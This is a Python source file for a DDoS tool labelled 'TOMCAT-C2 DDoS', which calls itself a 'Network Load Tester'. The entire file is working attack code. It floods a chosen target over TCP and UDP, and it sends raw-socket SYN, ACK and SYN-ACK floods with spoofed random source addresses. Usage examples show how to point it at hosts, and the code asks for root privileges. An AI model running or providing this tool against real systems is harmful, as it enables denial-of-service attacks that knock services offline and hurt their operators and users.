#!/usr/bin/python

# TOMCAT-C2 DDoS
# Work on Transport Layer (Layer 4)

import argparse
import os
import random
import socket
import struct
import sys
import time
import colorama
from colorama import Fore, init
from threading import Thread

init(autoreset=True)

class LoadTester:
    def __init__(self, target, port, method, threads, duration):
        self.target = target
        self.port = port
        self.method = method.upper()
        self.threads = threads
        self.duration = duration
        self.running = False
        self.packetCount = 0

    def checksum(self, data):
        s = 0
        for i in range(0, len(data), 2):
            if i + 1 < len(data):
                s += (data[i] << 8) + data[i + 1]
            else:
                s += data[i]
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

    def createIpHeader(self, src_ip, dst_ip):
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 0
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(dst_ip)
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            ip_ihl_ver,
            ip_tos,
            ip_tot_len,
            ip_id,
            ip_frag_off,
            ip_ttl,
            ip_proto,
            ip_check,
            ip_saddr,
            ip_daddr,
        )
        return ip_header

    def createTcpHeader(self, src_port, dst_port, flags):
        tcp_seq = random.randint(0, 4294967295)
        tcp_ack_seq = 0
        tcp_doff = 5
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        tcp_header = struct.pack(
            "!HHLLBBHHH",
            src_port,
            dst_port,
            tcp_seq,
            tcp_ack_seq,
            (tcp_doff << 4) + 0,
            flags,
            tcp_window,
            tcp_check,
            tcp_urg_ptr,
        )
        return tcp_header

    def tcpFlood(self):
        try:
            while self.running:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                try:
                    s.connect((self.target, self.port))
                    s.send(b"GET / HTTP/1.1\r\n\r\n")
                    self.packetCount += 1
                except Exception:
                    pass
                finally:
                    s.close()
        except Exception as e:
            print(f"TCP Error: {e}")

    def udpFlood(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = os.urandom(2048)
            while self.running:
                try:
                    s.sendto(data, (self.target, self.port))
                    self.packetCount += 1
                except Exception:
                    pass
        except Exception as e:
            print(f"UDP Error: {e}")

    def synFlood(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            while self.running:
                try:
                    src_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
                    src_port = random.randint(1024, 65535)
                    ip_header = self.createIpHeader(src_ip, self.target)
                    tcp_header = self.createTcpHeader(
                        src_port, self.port, 0x02
                    )
                    packet = ip_header + tcp_header
                    s.sendto(packet, (self.target, 0))
                    self.packetCount += 1
                except Exception:
                    pass
        except Exception as e:
            print(f"SYN Error: {e}")

    def ackFlood(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            while self.running:
                try:
                    src_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
                    src_port = random.randint(1024, 65535)
                    ip_header = self.createIpHeader(src_ip, self.target)
                    tcp_header = self.createTcpHeader(
                        src_port, self.port, 0x10
                    )
                    packet = ip_header + tcp_header
                    s.sendto(packet, (self.target, 0))
                    self.packetCount += 1
                except Exception:
                    pass
        except Exception as e:
            print(f"ACK Error: {e}")

    def synackFlood(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            while self.running:
                try:
                    src_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
                    src_port = random.randint(1024, 65535)
                    ip_header = self.createIpHeader(src_ip, self.target)
                    tcp_header = self.createTcpHeader(
                        src_port, self.port, 0x12
                    )
                    packet = ip_header + tcp_header
                    s.sendto(packet, (self.target, 0))
                    self.packetCount += 1
                except Exception:
                    pass
        except Exception as e:
            print(f"SYNACK Error: {e}")

    def start(self):
        print(f"\n{Fore.GREEN}[*] {Fore.WHITE}Starting {self.method} Load Test")
        print(f"{Fore.GREEN}[*] {Fore.WHITE}Target: {self.target}:{self.port}")
        print(f"{Fore.GREEN}[*] {Fore.WHITE}Threads: {self.threads}")
        print(f"{Fore.GREEN}[*] {Fore.WHITE}Duration: {self.duration}s")
        print(f"{Fore.RED}[*] Press Ctrl+C to stop\n")
        self.running = True
        if self.method == "TCP":
            methodType = self.tcpFlood
        elif self.method == "UDP":
            methodType = self.udpFlood
        elif self.method == "SYN":
            methodType = self.synFlood
        elif self.method == "ACK":
            methodType = self.ackFlood
        elif self.method == "SYNACK":
            methodType = self.synackFlood
        else:
            print(f"{Fore.RED}[!] Unknown Methods!")
            return
        threads = []
        for i in range(self.threads):
            t = Thread(target=methodType)
            t.daemon = True
            t.start()
            threads.append(t)
        startTime = time.time()
        try:
            while time.time() - startTime < self.duration:
                time.sleep(1)
                elapsed = int(time.time() - startTime)
                pps = self.packetCount // elapsed if elapsed > 0 else 0
                print(
                    f"{Fore.GREEN}[{elapsed}s] Packets Sent: {self.packetCount} | Rate: {pps} pps",
                    end="\r",
                )
        except KeyboardInterrupt:
            print(f"\n\n{Fore.RED}[!] Stopped by User")

        self.running = False
        time.sleep(1)
        print("\n\n[*] Attack Finished!")
        print(f"[*] Total Packets: {self.packetCount}")
        print(f"[*] Average Rate: {self.packetCount // self.duration} pps")


def main():
    parser = argparse.ArgumentParser(
        description="Network Load Tester - TCP/UDP/SYN/ACK",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
        {Fore.GREEN}
            Examples:
                python ddos.py -t 192.168.1.100 -p 80 -m TCP -n 20 -d 60
                python ddos.py -t example.com -p 53 -m UDP -n 20 -d 30
                python ddos.py -t 10.0.0.1 -p 443 -m SYN -n 20 -d 120
                python ddos.py -t 10.0.0.1 -p 443 -m ACK -n 20 -d 120
                python ddos.py -t 10.0.0.1 -p 443 -m SYNACK -n 20 -d 120
        {Fore.RESET}
        """,
    )
    parser.add_argument("-t", "--target", required=True, help="Target IP or Hostname")
    parser.add_argument("-p", "--port", type=int, required=True, help="Target port")
    parser.add_argument(
        "-m",
        "--method",
        required=True,
        choices=["TCP", "UDP", "SYN", "ACK", "SYNACK"],
        help="Method: TCP, UDP, SYN, ACK, SYNACK",
    )
    parser.add_argument(
        "-n", "--threads", type=int, default=10, help="Threads Count (default: 10)"
    )
    parser.add_argument(
        "-d",
        "--duration",
        type=int,
        default=60,
        help="Duration In Seconds (default: 60)",
    )
    args = parser.parse_args()
    if args.method in ["SYN", "ACK", "SYNACK"]:
        try:
            netSocket = socket.socket(
                socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP
            )
            netSocket.close()
        except PermissionError:
            print(f"\n{Fore.YELLOW}[!] Error: This Method Needed root/administrator Privileges!")
            print(f"{Fore.YELLOW}[!] Run With: sudo python ddos.py ...")
            sys.exit(1)
    try:
        targetIp = socket.gethostbyname(args.target)
        print(f"\n{Fore.GREEN}[*] Resolved {args.target} ~>> {targetIp}")
    except socket.gaierror:
        print(f"\n{Fore.RED}[!] Error: Cannot Resolved Hostname ~>> {args.target}")
        sys.exit(1)
    tester = LoadTester(targetIp, args.port, args.method, args.threads, args.duration)
    tester.start()

xbanner = f"""
{Fore.RED}
  ___________________      _____  _________     ________________ ________  ________   ________    _________
  \\__    ___/\\_____  \\    /     \\ \\_   ___ \\   /  _  \\__    ___/ \\______ \\ \\______ \\  \\_____  \\  /   _____/
    |    |    /   |   \\  /  \\ /  \\/    \\  \\/  /  /_\\  \\|    |     |    |  \\ |    |  \\  /   |   \\ \\_____  \\ 
    |    |   /    |    \\/    Y    \\     \\____/    |    \\    |     |    `   \\|    `   \\/    |    \\/        \\
    |____|   \\_______  /\\____|__  /\\______  /\\____|__  /____|    /_______  /_______  /\\_______  /_______  /
                     \\/         \\/        \\/         \\/                  \\/        \\/         \\/        \\/ 
{Fore.RESET}
"""

if __name__ == "__main__":
    os.system("cls" if os.name == 'nt' else "clear")
    print(xbanner)
    main()
